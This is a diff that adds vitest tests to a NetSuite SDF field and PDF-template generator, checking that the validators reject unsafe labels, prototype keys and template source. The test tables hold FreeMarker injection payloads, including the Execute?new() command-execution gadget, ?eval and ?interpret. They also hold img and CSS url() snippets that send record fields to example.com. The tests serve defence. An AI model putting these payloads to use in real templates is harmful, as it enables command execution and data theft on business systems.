@@ -1,3 +1,4 @@
+import { readFile } from "node:fs/promises";
 import { describe, expect, it } from "vitest";
 import { SdfSpecError, fieldArtifact, templateArtifact, withRequiredFeatures } from "../src";
 
@@ -114,6 +115,61 @@ describe("templateArtifact", () => {
     const spec = { record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source: INVOICE_SOURCE, ...patch };
     expect(() => templateArtifact(spec as never)).toThrow(SdfSpecError);
     expect(() => templateArtifact(spec as never)).toThrow(message);
+  });
+});
+
+describe("acceptance loop attempt 2 fixes", () => {
+  const base = { kind: "body", name: "rush", label: "Rush", type: "TEXT", appliesTo: ["sale"] };
+
+  it("takes selectRecordType only from the SDF list and adds its feature", () => {
+    const crm = fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-5" } as never);
+    expect(crm.features).toEqual(["CRM"]);
+    expect(fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-2" } as never).features).toEqual([]);
+    expect(() => fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-1" } as never)).toThrow("SDF list");
+    expect(() => fieldArtifact({ ...base, type: "SELECT", selectRecordType: "-11" } as never)).toThrow("SDF list");
+  });
+
+  it.each(["constructor", "toString", "__proto__", "hasOwnProperty"])("rejects the inherited key %s as an applies-to target", (key) => {
+    expect(() => fieldArtifact({ ...base, appliesTo: [key] } as never)).toThrow("body fields apply to");
+  });
+
+  it.each([
+    [{ label: "Rush\u0007" }, "control characters"],
+    [{ help: "bad \u0000 help" }, "control characters"],
+    [{ description: "x\u001F" }, "control characters"],
+    [{ label: "[scriptid=custbody_x]" }, 'must not start with "["'],
+    [{ help: " [scriptid=x]" }, 'must not start with "["'],
+  ])("rejects unsafe text %o", (patch, message) => {
+    expect(() => fieldArtifact({ ...base, ...patch } as never)).toThrow(message);
+  });
+
+  it.each([
+    ['[#include "x.ftl"]', "include"],
+    ['<#assign t = "<#" + "include x>"><@t?interpret/>', "?interpret"],
+    ['${"1+1"?eval}', "?eval"],
+    ['<#assign x = "freemarker.template.utility.Execute"?new()>', "?new"],
+    ['<img src="https://example.com/x?d=${record.entity}"/>', "src, href or url()"],
+    ["<div style=\"background: url('https://example.com/${record.total}')\"/>", "src, href or url()"],
+  ])("rejects template source %s", (snippet, message) => {
+    const source = INVOICE_SOURCE.replace("<table", `${snippet}<table`);
+    expect(() => templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source })).toThrow(message);
+  });
+
+  it("allows a fixed image URL", () => {
+    const source = INVOICE_SOURCE.replace("<table", '<img src="https://system.netsuite.com/core/media/media.nl?id=1"/><table');
+    expect(() => templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source })).not.toThrow();
+  });
+
+  it("writes only elements a template exported from the demo account also has", async () => {
+    // test/fixtures/imported-advancedpdftemplate.xml: `suitecloud object:import` of custtmpl_bpc_inv_w_attach from TSTDRV1755417.
+    const imported = await readFile(new URL("fixtures/imported-advancedpdftemplate.xml", import.meta.url), "utf8");
+    const tags = (xml: string) => new Set([...xml.matchAll(/^\s*<([a-z]+)>/gm)].map((m) => m[1]));
+    const generated = templateArtifact({ record: "invoice", purpose: "standard", title: "NS Agent - Invoice", source: INVOICE_SOURCE });
+    const ours = tags(generated.files[0]!.content);
+    expect([...ours].filter((t) => !tags(imported).has(t))).toEqual([]);
+    expect(ours).toContain("printtype");
+    expect(ours).toContain("trantype");
+    expect(imported).toContain('standard="STDTMPLCUSTINVC"');
   });
 });
 
